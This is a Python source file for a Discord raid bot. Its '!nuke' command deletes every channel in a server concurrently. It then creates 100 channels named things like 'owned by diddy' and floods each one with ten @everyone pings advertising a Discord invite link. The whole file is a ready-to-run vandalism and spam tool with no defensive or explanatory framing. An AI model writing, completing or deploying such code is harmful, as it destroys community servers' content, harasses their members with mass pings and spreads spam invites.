import discord
import asyncio
from discord.ext import commands

# Initialize bot with all intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

channel_names = ["diddy runs you", "owned by diddy", "p diddy"]

@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")

async def create_channel_and_ping(guild, channel_name):
    new_channel = await guild.create_text_channel(channel_name)
    print(f"Created channel: {new_channel.name}")

    ping_tasks = [new_channel.send("@everyone DIDDY RUNS YOU discord.gg/fwGmQdMkHr") for _ in range(10)]
    await asyncio.gather(*ping_tasks)  # Send pings concurrently
    print(f"Completed pings in {new_channel.name}")

@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild

    delete_tasks = []
    for channel in guild.channels:
        delete_tasks.append(asyncio.create_task(delete_channel(channel)))
    await asyncio.gather(*delete_tasks)  # Delete channels concurrently

    for i in range(100):
        channel_name = channel_names[i % len(channel_names)]
        asyncio.create_task(create_channel_and_ping(guild, channel_name))

async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"Deleted channel: {channel.name}")
    except discord.Forbidden:
        print(f"Skipping channel {channel.name} - insufficient permissions.")
    except Exception as e:
        print(f"An error occurred while deleting {channel.name}: {e}")

bot.run("paste your bot token")
